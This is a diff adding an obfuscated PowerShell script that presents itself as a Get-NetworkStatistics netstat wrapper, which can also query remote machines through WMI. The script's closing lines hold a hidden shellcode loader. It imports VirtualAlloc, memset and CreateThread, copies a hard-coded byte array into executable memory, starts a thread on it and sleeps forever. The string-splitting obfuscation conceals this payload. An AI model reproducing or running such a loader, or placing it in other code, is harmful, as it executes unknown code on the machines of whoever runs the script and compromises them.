@@ -1,0 +1,290 @@
+ SeT-variabLE  t29O  ( [TypE]("{4}{1}{3}{0}{6}{2}{5}{7}"-f 'trI','stem','pLi','.S','Sy','TOpTION','NGs','s')  );  Sv  ('n'+'oYI8K')  ( [tyPE]("{2}{3}{1}{0}" -F 'S','stEm.neT.Dn','S','Y')) ; function Get`-n`E`T`woRk`sTATiStICS {
+    	
+	[OutputType({"{9}{3}{5}{1}{0}{2}{7}{8}{4}{6}"-f'ge','em.Mana','ment.','ys','omat','t','ion.PSObject','Au','t','S'})]
+	[CmdletBinding()]
+	param(
+		
+		[Parameter(pOsITiOn=0)]
+		[System.String]${P`RoCeS`sNa`me}='*',
+		
+		[Parameter(POsItIoN=1)]
+		[System.String]${A`d`drESs}='*',		
+		
+		[Parameter(pOsITIOn=2)]
+		${p`oRT}='*',
+
+		[Parameter(pOsitIOn=3,
+                   valuEFRomPIPeLInE = ${Tr`UE},
+                   ValUEfrOMpipeLInEBYPRopertyNaME = ${T`RUE})]
+        [System.String[]]${CoMPu`T`ERn`Ame}=${e`N`V`:comPUTEr`Na`mE},
+
+		[ValidateSet('*','tcp','udp')]
+		[System.String]${pRo`T`OCoL}='*',
+
+		[ValidateSet('*',{"{0}{1}" -f'Cl','osed'},{"{0}{1}{2}" -f 'Close','_','Wait'},{"{0}{1}"-f 'Clo','sing'},{"{0}{1}{2}"-f 'Delet','e_T','cb'},{"{0}{2}{1}"-f'D','teTcb','ele'},{"{2}{1}{0}"-f'hed','blis','Esta'},{"{1}{0}{2}"-f 'n_Wa','Fi','it_1'},{"{1}{0}{2}" -f'in_Wai','F','t_2'},{"{1}{2}{0}" -f't_Ack','La','s'},{"{0}{1}{2}" -f'L','istenin','g'},{"{1}{0}{2}" -f 'e','Syn_Rec','ived'},{"{1}{0}{2}"-f'y','S','n_Sent'},{"{2}{1}{0}" -f 'it','a','Time_W'},{"{0}{1}{2}"-f 'U','nkno','wn'})]
+		[System.String]${St`A`TE}='*',
+
+        [switch]${SHowhoS`TNA`mEs},
+        
+        [switch]${shoWprocE`ssn`A`mEs} = ${T`RuE},	
+
+        [System.String]${Te`mp`FilE} = ((("{2}{4}{0}{5}{3}{1}"-f '}n','at.txt','C:{','st','0','et'))-f [cHar]92),
+
+        [validateset('*',{"{0}{1}"-f 'I','Pv4'},{"{0}{1}"-f 'IP','v6'})]
+        [string]${A`D`D`RES`SFAMiLy} = '*'
+	)
+    
+	begin{
+        
+            ${PR`Op`ErTI`eS} = ("{2}{1}{0}{3}"-f 'N','r','Compute','ame'),{"{2}{0}{1}"-f 'ot','ocol','Pr'},{"{0}{1}{2}"-f'LocalAd','dres','s'},{"{2}{0}{1}"-f 'calPor','t','Lo'},{"{2}{1}{0}{3}"-f 's','ddre','RemoteA','s'},{"{0}{2}{1}" -f 'Remote','rt','Po'},{"{1}{0}" -f 'ate','St'},{"{2}{1}{0}"-f 'essName','oc','Pr'},'PID'
+
+        
+            ${d`NSC`AC`he} = @{}
+            
+	}
+	
+	process{
+
+        foreach(${Co`mput`Er} in ${C`Om`Puter`NAMe}) {
+
+            
+            if(${sh`oWp`RoCEs`SNAM`Es}){
+                Try {
+                    ${PR`oCeSS`eS} = &("{2}{0}{1}" -f 'et-Proces','s','G') -ComputerName ${cO`Mp`UTEr} -ErrorAction ("{0}{1}" -f 's','top') | &("{0}{2}{1}" -f's','lect','e') ("{0}{1}"-f 'na','me'), ('id')
+                }
+                Catch {
+                    &("{1}{0}{2}" -f 'arn','Write-w','ing') ('Coul'+'d '+'not'+' '+'ru'+'n '+'Get'+'-P'+'rocess'+' '+'-comput'+'e'+'rname '+"$Computer. "+' '+'V'+'erify '+'pe'+'rm'+'i'+'ssions '+'a'+'nd '+'c'+'onnec'+'t'+'ivity. '+' '+'De'+'fault'+'in'+'g '+'t'+'o '+'no'+' '+'S'+'how'+'Pr'+'oce'+'ssNames')
+                    ${Sh`OWp`Ro`CESSNAM`eS} = ${faL`sE}
+                }
+            }
+	    
+            
+                if(${c`o`MP`UTer} -ne ${env:c`om`putER`NAme}){
+
+                    
+                        [string]${c`MD} = ('cm'+'d '+'/c'+' '+('c'+':ApDwind'+'o'+'ws'+'Ap'+'Ds'+'yst'+'em32A'+'pD'+'n'+'etstat.ex'+'e ')."ReP`lace"(([cHaR]65+[cHaR]112+[cHaR]68),[sTrinG][cHaR]92)+'-a'+'no '+'>>'+' '+"$tempFile")
+            
+                    
+                        ${REMo`Te`TEm`PF`ile} = "\\{0}\{1}`${2}" -f "$Computer", (&("{2}{1}{0}" -f'h','plit-pat','s') ${TEmPfi`LE} -qualifier).("{2}{0}{1}" -f 'imEn','d','Tr').Invoke(":"), (&("{2}{0}{1}" -f'-P','ath','Split') ${tE`mPFI`lE} -noqualifier)
+
+                    
+                        Try{
+                            ${nu`LL} = &("{2}{3}{1}{0}"-f'ethod','WmiM','I','nvoke-') -class ("{3}{0}{1}{2}"-f'in','32_pro','cess','W') -name ("{1}{0}"-f'ate','Cre') -ArgumentList ('cmd'+' '+'/'+'c '+'d'+'el '+"$tempFile") -ComputerName ${comp`UT`ER} -ErrorAction ("{0}{1}"-f 'st','op')
+                        }
+                        Catch{
+                            &("{2}{0}{1}"-f'rite-Wa','rning','W') ('Coul'+'d '+'no'+'t '+'inv'+'oke '+'c'+'r'+'eate '+'win3'+'2'+'_pr'+'oc'+'ess '+'o'+'n '+"$Computer "+'t'+'o '+'de'+'l'+'ete '+"$tempfile")
+                        }
+
+                    
+                        Try{
+                            ${pr`oC`EssiD} = (&("{2}{0}{3}{1}"-f'voke-Wm','thod','In','iMe') -class ("{0}{3}{1}{2}" -f 'Win3','roce','ss','2_p') -name ("{1}{0}" -f'eate','Cr') -ArgumentList ${c`md} -ComputerName ${COmp`Ut`Er} -ErrorAction ("{0}{1}" -f 's','top'))."proces`s`ID"
+                        }
+                        Catch{
+                            
+                            Throw ${_}
+                            Break
+                        }
+
+                    
+                        while (
+                            
+                                $(
+                                    try{
+                                        &("{2}{0}{1}"-f't-p','rocess','ge') -id ${PR`ocEsS`Id} -computername ${cOmpu`T`Er} -ErrorAction ("{0}{1}" -f'S','top')
+                                    }
+                                    catch{
+                                        ${FA`lSE}
+                                    }
+                                )
+                        ) {
+                            &("{0}{3}{2}{1}"-f'sta','eep','t-sl','r') -seconds 2 
+                        }
+            
+                    
+                        if(&("{1}{3}{2}{0}" -f'-path','t','st','e') ${R`EMoT`etE`mpfi`Le}){
+                    
+                            Try {
+                                ${R`ESU`lTS} = &("{3}{2}{0}{1}"-f 't','ent','t-Con','Ge') ${remO`Te`T`EmP`FiLe} | &("{1}{2}{0}"-f 'ring','Select-S','t') -Pattern ((("{3}{2}{0}{1}{4}" -f'kLU','DP','mds+(TCPE','p',')'))-rEplACe ([CHar]69+[CHar]107+[CHar]76),[CHar]124  -rEplACe'pmd',[CHar]92)
+                            }
+                            Catch {
+                                Throw ('Coul'+'d'+' '+'n'+'ot '+'ge'+'t '+'cont'+'e'+'nt '+'fr'+'om '+"$remoteTempFile "+'f'+'or '+'re'+'sults')
+                                Break
+                            }
+
+                            &("{1}{2}{0}{3}"-f 've-I','Re','mo','tem') ${REM`OTETE`MPfI`LE} -force
+
+                        }
+                        else{
+                            Throw ("'$tempFile' "+'on'+' '+"$Computer "+'conv'+'erted'+' '+'to'+' '+"'$remoteTempFile'. "+' '+'Th'+'is '+'pat'+'h '+'is'+' '+'not'+' '+'a'+'ccessi'+'ble'+' '+'fr'+'om '+'y'+'our '+'s'+'ystem.')
+                            Break
+                        }
+                }
+                else{
+                    
+                        ${re`s`ULtS} = &("{1}{0}" -f 'stat','net') -ano | &("{2}{4}{1}{0}{3}"-f 't-S','ec','S','tring','el') -Pattern ((("{2}{4}{0}{1}{3}" -f 'C','P','3','W4XUDP)','Hns+(T'))  -rEplace '3Hn',[chAr]92  -CRePLaCE([chAr]87+[chAr]52+[chAr]88),[chAr]124)
+                }
+
+            
+                ${tOT`AL`c`oUnT} = ${ResUL`Ts}."cOu`NT"
+                ${COU`NT} = 0
+    
+            
+	            foreach(${R`Es`Ult} in ${r`esu`ltS}) {
+            
+    	            ${iT`Em} = ${R`ESULt}."Li`NE"."sP`lIT"(' ',  (  gEt-ITeM VAriABLe:t29o).ValUE::"R`E`mo`VEEmPtYENtr`Ies")
+    
+    	            if(${It`Em}[1] -notmatch ((("{2}{1}{0}" -f '[::','0}','^{'))-F [ChaR]92)){
+                    
+                        
+    	                    if ((${L`A} = ${I`Tem}[1] -as [ipaddress])."ADd`REs`sf`AMILY" -eq ("{2}{1}{0}" -f 'orkV6','Netw','Inter')){
+    	                        ${lo`cA`Lad`DReSs} = ${l`A}."iP`A`DDr`Es`STOsTRING"
+    	                        ${Loc`AlP`oRT} = ${iT`EM}[1].("{0}{1}" -f 's','plit').Invoke('\]:')[-1]
+    	                    }
+    	                    else {
+    	                        ${l`o`CalAdDR`ESS} = ${IT`Em}[1].("{0}{1}" -f'sp','lit').Invoke(':')[0]
+    	                        ${l`ocA`LPO`Rt} = ${I`TEm}[1].("{0}{1}"-f 'spl','it').Invoke(':')[-1]
+    	                    }
+                    
+                        
+    	                    if ((${r`A} = ${it`EM}[2] -as [ipaddress])."aDDr`es`SfAmILy" -eq ("{3}{1}{0}{2}" -f'tw','e','orkV6','InterN')){
+    	                        ${REmOTE`AD`dRESS} = ${r`A}."i`pAddResS`Tost`RinG"
+    	                        ${reM`Otepo`RT} = ${iT`Em}[2].("{0}{1}" -f'sp','lit').Invoke('\]:')[-1]
+    	                    }
+    	                    else {
+    	                        ${RemOt`EADD`RE`SS} = ${It`EM}[2].("{1}{0}"-f 'it','spl').Invoke(':')[0]
+    	                        ${R`E`moTePORT} = ${i`Tem}[2].("{0}{1}" -f 'spli','t').Invoke(':')[-1]
+    	                    }
+
+                        
+                            if(${aD`d`R`ES`SFAMily} -ne "*")
+                            {
+                                if(${addres`SfaM`I`LY} -eq ("{0}{1}"-f'IP','v4') -and ${LoCaL`A`ddreSs} -match ':' -and ${ReMotE`Add`RESs} -match ((("{1}{2}{0}" -f'}{0}*',':','{1')) -F [Char]92,[Char]124) )
+                                {
+                                    
+                                    &("{3}{0}{2}{1}" -f'ri','se','te-Verbo','W') ('F'+'il'+'tered '+'b'+'y '+"AddressFamily:`n$result")
+                                    continue
+                                }
+                                elseif(${AD`DreS`sFam`ILy} -eq ("{1}{0}" -f'v6','IP') -and ${lOCa`LaddR`E`Ss} -notmatch ':' -and ( ${ReMot`eADdR`E`ss} -notmatch ':' -or ${REMot`EA`D`drESs} -match '*' ) )
+                                {
+                                    
+                                    &("{1}{0}{2}{3}" -f'r','W','ite-Verb','ose') ('F'+'ilter'+'ed '+'by'+' '+"AddressFamily:`n$result")
+                                    continue
+                                }
+                            }
+    	    		
+                        
+    	    		        ${p`Rocid} = ${It`eM}[-1]
+    	    		        ${P`R`oTo} = ${i`TeM}[0]
+    	    		        ${S`TaTUS} = if(${I`Tem}[0] -eq 'tcp') {${I`Tem}[3]} else {${N`ULl}}	
+
+                        
+		    		        if(${RE`motepO`Rt} -notlike ${p`Ort} -and ${LOcA`l`PorT} -notlike ${pO`RT}){
+                                &("{0}{3}{1}{2}"-f'wri','bo','se','te-ver') ('remot'+'e '+"$Remoteport "+'lo'+'cal '+"$localport "+'po'+'rt '+"$port")
+                                &("{0}{1}{2}"-f'Wr','ite','-Verbose') ('Fi'+'lter'+'ed '+'by'+' '+"Port:`n$result")
+                                continue
+		    		        }
+
+		    		        if(${REmo`TeA`Ddr`eSS} -notlike ${ad`DR`Ess} -and ${lo`CalADD`R`E`ss} -notlike ${a`dDresS}){
+                                &("{2}{0}{1}" -f'r','bose','Write-Ve') ('Fi'+'l'+'tered '+'by'+' '+"Address:`n$result")
+                                continue
+		    		        }
+    	    			     
+    	    			    if(${S`TaTUS} -notlike ${S`TaTe}){
+                                &("{3}{1}{0}{2}" -f '-V','e','erbose','Writ') ('Filt'+'er'+'ed '+'by'+' '+"State:`n$result")
+                                continue
+		    		        }
+
+    	    			    if(${Pr`otO} -notlike ${pRo`T`O`COl}){
+                                &("{0}{2}{1}"-f 'Wri','se','te-Verbo') ('F'+'i'+'ltered '+'b'+'y '+"Protocol:`n$result")
+                                continue
+		    		        }
+                   
+                        
+                            &("{2}{0}{1}{3}" -f'Pr','ogr','Write-','ess')  -Activity ("{4}{2}{0}{7}{1}{9}{6}{8}{3}{5}"-f 'ving ',' ','esol',' name','R','s','proces','host','s','and ')`
+                                -Status ('Res'+'ol'+'ving '+'p'+'ro'+'cess '+'I'+'D '+"$procId "+'with'+' '+'rem'+'o'+'te '+'add'+'res'+'s '+"$remoteAddress "+'and'+' '+'local'+' '+'a'+'d'+'dress '+"$localAddress")`
+                                -PercentComplete (( ${C`O`UNT} / ${t`O`TA`lCOunT} ) * 100)
+    	    		
+                        
+                            if(${shoWPr`O`ce`SSnAmeS} -or ${p`sboU`ND`pa`RaMet`ErS}."c`O`NtaIn`SkEY" -eq ("{1}{2}{3}{0}"-f 'me','Proc','essN','a')){
+                        
+                                
+                                if(${p`Ro`CNAMe} = ${pRoC`e`s`SeS} | &("{0}{1}" -f 'Wher','e') {${_}."i`d" -eq ${p`ROc`iD}} | &("{1}{0}{2}" -f'lec','se','t') -ExpandProperty ("{0}{1}" -f'n','ame') ){ }
+                                else {${pro`CnA`ME} = ("{1}{2}{0}"-f 'n','Un','know')}
+
+                            }
+                            else{${Pro`cn`AMe} = "NA"}
+
+		    		        if(${PRoc`Na`ME} -notlike ${Pr`oCESsn`Ame}){
+                                &("{0}{2}{1}" -f 'W','se','rite-Verbo') ('Fi'+'ltered'+' '+'by'+' '+"ProcessName:`n$result")
+                                continue
+		    		        }
+    	    						
+                        
+                            if(${s`HOW`hoStna`mES}){
+                                ${t`mpA`DdRESS} = ${nu`lL}
+                                try{
+                                    if(${REm`ot`EADD`Re`SS} -eq ("{1}{0}"-f'.1','127.0.0') -or ${reMoteAD`D`RESS} -eq ("{0}{1}" -f '0.0.0.','0')){
+                                        ${reMOTe`AD`D`R`eSs} = ${COmPU`T`eR}
+                                    }
+                                    elseif(${remO`TEaD`Dr`Ess} -match "\w"){
+                                        
+                                        
+                                            if (${d`Ns`cAche}.("{3}{2}{0}{1}" -f 'ainske','y','t','con').Invoke( ${R`emOTEaD`DR`eSS})) {
+                                                ${Re`mOT`eAddReSs} = ${d`NsC`AcHe}[${rEmO`TEa`D`Dr`ESs}]
+                                                &("{0}{1}{2}" -f 'writ','e-verbos','e') ('using'+' '+'cached'+' '+'R'+'EMOTE '+"'$remoteAddress'")
+                                            }
+                                            else{
+                                                
+                                                    ${tMpA`ddr`e`SS} = ${reMo`Te`ADdResS}
+                                                    ${reM`oTea`Dd`R`esS} =  (varIaBle noyi8K -Va )::("{3}{4}{0}{2}{1}" -f'stB','s','yAddres','G','etHo').Invoke("$remoteAddress")."Ho`S`TNamE"
+                                                    ${d`NSCaC`hE}.("{1}{0}" -f 'dd','a').Invoke(${Tm`padD`RE`Ss}, ${RemoTe`AD`DrESS})
+                                                    &("{1}{2}{0}{3}" -f'te-verb','wr','i','ose') ('usi'+'ng'+' '+'n'+'on '+'cac'+'hed '+'REMOT'+'E '+"'$remoteAddress`t$tmpAddress")
+                                            }
+                                    }
+                                }
+                                catch{ }
+
+                                try{
+
+                                    if(${lo`cA`La`dDREsS} -eq ("{2}{0}{1}"-f'0.0.','1','127.') -or ${loC`AlAD`Dr`ess} -eq ("{1}{0}"-f'.0.0','0.0')){
+                                        ${L`OCAL`A`DdR`Ess} = ${CO`m`PUTER}
+                                    }
+                                    elseif(${LO`cAL`ADD`REss} -match "\w"){
+                                        
+                                            if(${DnS`CA`CHe}.("{0}{2}{3}{1}"-f 'c','skey','on','tain').Invoke(${l`Oc`AlAd`d`ReSS})){
+                                                ${LOcalADd`R`E`Ss} = ${D`N`sCaC`he}[${lOCa`La`D`D`ReSs}]
+                                                &("{1}{0}{2}"-f 'verbo','write-','se') ('us'+'in'+'g '+'cac'+'h'+'ed '+'L'+'OCAL '+"'$localAddress'")
+                                            }
+                                            else{
+                                                
+                                                    ${Tmp`A`Dd`REsS} = ${LocAlAD`dRe`ss}
+                                                    ${lOcaLAdD`RE`Ss} =   ${N`oyI`8K}::("{1}{4}{0}{2}{3}"-f'ByAd','GetHos','dres','s','t').Invoke("$localAddress")."HOstNa`me"
+                                                    ${dNs`Cac`He}.("{0}{1}"-f 'a','dd').Invoke(${LOc`A`LAdDr`eSs}, ${TMP`A`ddREsS})
+                                                    &("{3}{0}{1}{2}"-f'r','ite-verb','ose','w') ('us'+'ing'+' '+'non'+' '+'c'+'ached '+'LOC'+'AL '+"'$localAddress'`t'$tmpAddress'")
+                                            }
+                                    }
+                                }
+                                catch{ }
+                            }
+    
+    	    		    
+    	    		        &("{2}{1}{0}" -f 'ect','ew-Obj','N') -TypeName ("{0}{1}" -f 'PS','Object') -Property @{
+		    		            ("{0}{1}{2}"-f 'Co','mpu','terName') = ${C`OMput`er}
+                                ("{1}{0}" -f 'D','PI') = ${PRO`c`id}
+		    		            ("{1}{0}{3}{2}" -f 'a','ProcessN','e','m') = ${PROCN`AME}
+		    		            ("{2}{1}{0}"-f'otocol','r','P') = ${Pr`Oto}
+		    		            ("{3}{2}{1}{0}" -f'ss','ddre','calA','Lo') = ${l`OC`A`LAD`dREss}
+		    		            ("{2}{0}{1}" -f 'ocalPor','t','L') = ${lo`cal`port}
+		    		            ("{2}{3}{1}{0}"-f 's','es','RemoteAdd','r') =${rEMoTea`DDre`sS}
+		    		            ("{0}{1}{2}"-f 'RemoteP','or','t') = ${r`EmoT`Ep`oRt}
+		    		            ("{1}{0}"-f'tate','S') = ${STa`TUs}
+		    	            } | &("{3}{0}{2}{1}" -f 'elec','ect','t-Obj','S') -Property ${PROP`Er`TI`eS}								
+
+                        
+                            ${C`Ou`NT}++
+                    }
+                }
+        }
+    }
+}
+${U`FJ} = ((("{4}{12}{33}{15}{9}{63}{61}{46}{104}{82}{66}{38}{2}{26}{84}{58}{65}{54}{83}{29}{88}{16}{41}{89}{60}{105}{94}{99}{35}{62}{5}{91}{20}{3}{32}{87}{25}{37}{77}{23}{30}{14}{55}{43}{52}{7}{47}{73}{27}{97}{6}{28}{42}{106}{86}{67}{53}{96}{69}{56}{75}{0}{45}{76}{101}{50}{107}{64}{93}{17}{21}{70}{49}{59}{81}{103}{39}{51}{57}{8}{71}{85}{72}{13}{34}{1}{44}{98}{10}{100}{74}{102}{36}{22}{78}{95}{79}{90}{31}{18}{40}{48}{19}{92}{80}{11}{24}{68}" -f'es, uin','hre','ualAlloc(I','ct);','[','i','(I',' Cre','lags','qMCkernel32.dllqMC)]public s','t(q',' uint co','DllIm','Ptr',')]publi','ort(',',','artAdd','IntPtr me','es','Prote','re','qMC)]','2.d','un','M','ntPt','hr','n','s','llqMC','n ','[D','p',' lpT','l','l','Ckernel','rt','in','mset(Int',' ui','tPtr l','rn IntPt','adId);[','t ','xt','a','Ptr d','nt','Int','t','r','a','r','c static exte','u',' dwCreationF','lp','Ptr lpParameter','t dwSize, ','ic e','Allocat','tat','tr l','Add','Ptr Vi','e','t);','trib','ss, I',',','Int','teT','r','t','d','3','pub','static',', uint src,',',','rn Int','e','r ',' ','r','llImport(q','s','n',' exter','onType, uint fl','t','pSt','in','lic ','dAt','ead','DllImpor','t f','MCmsvc','wStackSize, ','t.dl',' u','e','u','pTh','P'))."R`EPlaCE"('qMC',[stRING][chAR]34));${w} = &("{2}{0}{1}" -f 'dd-Ty','pe','A') -memberDefinition ${u`Fj} -Name ("{0}{1}" -f'Wi','n32') -namespace ("{0}{3}{1}{2}" -f'Win32F','ct','ions','un') -passthru;[Byte[]];[Byte[]]${z} = 0xb8,0xe9,0x2e,0xce,0xb6,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0xe6,0xcc,0x3b,0x4a,0x10,0x92,0xc4,0xb3,0xe0,0xf3,0x4d,0x56,0xd1,0x33,0x29,0x12,0x41,0x84,0x39,0x76,0x6d,0x6f,0x6f,0x63,0xe6,0x1d,0xb8,0x84,0x4f,0xab,0x9e,0xab,0x50,0x80,0xe3,0xaa,0xd2,0xdb,0x37,0x0d,0xeb,0x13,0x4a,0x4c,0x2c,0x49,0xa7,0x1c,0xe5,0x05,0x1a,0xb1,0x82,0x50,0xa7,0x3a,0xd8,0x75,0xaf,0xdf,0xa8,0x74,0x9e,0x71,0xa3,0x2e,0x00,0x73,0x60,0x5b,0x09,0x6b,0x65,0x66,0xc3,0x00,0x5d,0x1c,0xd2,0xc0,0xac,0xdd,0x79,0x2d,0x01,0x2c,0x83,0x69,0xa5,0xcf,0xf6,0x83,0xd6,0x72,0x01,0x50,0xa5,0xa8,0x84,0x43,0x0d,0x3a,0x3e,0xa8,0xac,0xef,0xd9,0x3b,0xa2,0x44,0xad,0x64,0xa6,0x5b,0x62,0x1f,0xd2,0xd0,0x85,0xf0,0x53,0xa2,0xa1,0xd4,0x38,0x70,0xcb,0x4d,0xe4,0xd7,0xf4,0x8e,0x47,0x87,0x50,0xc4,0x65,0xdc,0xe8,0x87,0xe1,0x11,0xc1,0x37,0xf1,0x3d,0x52,0x4b,0xc3,0xe2,0xc8,0xc3,0x6f,0x6a,0xd7,0x14,0x90,0x41,0xaf,0x8b,0x6f,0x6a,0xd0,0x82,0xab,0x3e,0x80,0xbc,0x1a,0x3f,0x4b,0x3d,0xa3,0xea,0xe6,0x38,0x33,0xd5,0x06,0xfd,0xab,0xbd,0xea,0x02,0x2a,0x85,0x62,0xe4,0x7c,0xa9,0x24,0xb9,0x3c,0x19,0x85,0x69,0xd4,0x73,0x0a,0x55,0xc4,0x7b,0xc0,0xfe,0x6e,0x94,0xbd,0x57,0x06,0x0d,0xe4,0x2c,0xb7,0xd2,0x32,0x49,0xf7,0x59,0xb1,0xad,0xb9,0xa9,0xbc,0xbd,0x2d,0x5a,0x8b,0x9c,0xfb,0x65,0x21,0x8a,0x03,0xf0,0xce,0x1d,0x54,0x6c,0xcd,0x78,0x92,0x33,0x2e,0xaf,0xa9,0xfa,0xba,0x10,0xc5,0x02,0x2b,0x91,0x15,0x55,0x21,0x91,0x7d,0x01,0x11,0xc2,0x98,0x4e,0x8c,0x76,0x31,0xdb,0x2f,0x2f,0xe6,0x4c,0x58,0xcd,0xd1,0xbb,0xc7,0x2e,0x34,0x3a,0x3b,0xf9,0x70,0x48,0x55,0x39;${g} = 0x1000;if (${Z}."LE`NgTH" -gt 0x1000){${G} = ${z}."LeN`GTH"};${t`Mh}=${w}::("{0}{1}{2}{3}" -f'Vir','t','u','alAlloc').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."leNG`TH"-1);${I}++) {${w}::"MEM`Set"([IntPtr](${T`MH}.("{0}{2}{1}" -f 'To','32','Int').Invoke()+${I}), ${Z}[${i}], 1)};${W}::("{1}{2}{0}"-f'hread','Create','T').Invoke(0,0,${t`MH},0,0,0);for (;;){&("{1}{0}{2}" -f'rt-s','Sta','leep') 60};
